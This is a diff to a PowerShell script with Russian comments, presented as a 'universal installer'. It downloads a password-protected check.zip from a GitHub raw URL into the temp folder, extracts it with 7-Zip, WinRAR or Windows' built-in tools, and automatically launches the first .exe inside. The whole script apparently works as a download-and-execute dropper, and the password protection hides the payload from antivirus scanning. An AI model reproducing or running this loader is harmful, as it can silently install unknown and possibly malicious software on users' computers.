@@ -1,5 +1,5 @@
 # =============================================
-# Auto Installer без 7-Zip
+# Универсальный Installer (7-Zip / WinRAR / Windows)
 # =============================================
 
 $Url = "https://raw.githubusercontent.com/v25888656-maker/check_install/main/check.zip"
@@ -11,42 +11,49 @@ $ExtractPath  = "$env:TEMP\check_extracted"
 Write-Host "[+] Скачиваем архив..." -ForegroundColor Cyan
 Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -UseBasicParsing
 
-Write-Host "[+] Распаковываем архив (с паролем)..." -ForegroundColor Cyan
-
-# Создаём папку
 New-Item -ItemType Directory -Path $ExtractPath -Force | Out-Null
 
-# Способ 1: Через встроенный Expand-Archive (не всегда работает с паролем)
-try {
-    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction Stop
-    Write-Host "[+] Распаковано без пароля (если работал)" -ForegroundColor Green
-} catch {
-    Write-Host "[-] Обычный метод не сработал (нужен пароль)" -ForegroundColor Yellow
+Write-Host "[+] Ищем программу для распаковки..." -ForegroundColor Cyan
+
+$Extracted = $false
+
+# 1. Проверка 7-Zip
+$7z = "C:\Program Files\7-Zip\7z.exe"
+if (Test-Path $7z) {
+    Write-Host "[+] Используем 7-Zip" -ForegroundColor Green
+    & $7z x "$DownloadPath" -o"$ExtractPath" -p"$Password" -y -bso0
+    $Extracted = $true
 }
 
-# Если не распаковалось — пробуем другой метод
-if ((Get-ChildItem $ExtractPath -File).Count -eq 0) {
-    Write-Host "[+] Пробуем альтернативный метод распаковки..." -ForegroundColor Cyan
-    
-    # Альтернатива через COM (работает в некоторых версиях Windows)
-    $shell = New-Object -ComObject Shell.Application
-    $zip = $shell.NameSpace($DownloadPath)
-    $destination = $shell.NameSpace($ExtractPath)
-    
-    foreach($item in $zip.items()) {
-        $destination.CopyHere($item, 0x14)  # 0x14 = скрывать диалоги
+# 2. Проверка WinRAR
+if (-not $Extracted) {
+    $winrar = "C:\Program Files\WinRAR\WinRAR.exe"
+    if (Test-Path $winrar) {
+        Write-Host "[+] Используем WinRAR" -ForegroundColor Green
+        & $winrar x -p"$Password" -o+ "$DownloadPath" "$ExtractPath"
+        $Extracted = $true
     }
-    Write-Host "[+] Попытка распаковки через Windows Explorer завершена" -ForegroundColor Green
+}
+
+# 3. Если ничего не нашли — пробуем встроенный метод Windows
+if (-not $Extracted) {
+    Write-Host "[+] Программы не найдены, пробуем встроенный метод..." -ForegroundColor Yellow
+    try {
+        Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force
+        $Extracted = $true
+    } catch {
+        Write-Host "[-] Встроенный метод не сработал (нужен пароль)" -ForegroundColor Red
+    }
 }
 
 # Автоматический запуск .exe
 $ExeFiles = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
 
 if ($ExeFiles) {
-    Write-Host "[+] Найден файл: $($ExeFiles.Name)" -ForegroundColor Green
+    Write-Host "[+] Найден: $($ExeFiles.Name)" -ForegroundColor Green
     Start-Process $ExeFiles.FullName
 } else {
-    Write-Host "[-] .exe файл не найден!" -ForegroundColor Red
+    Write-Host "[-] .exe файл не найден, открываю папку..." -ForegroundColor Yellow
     explorer $ExtractPath
 }
 
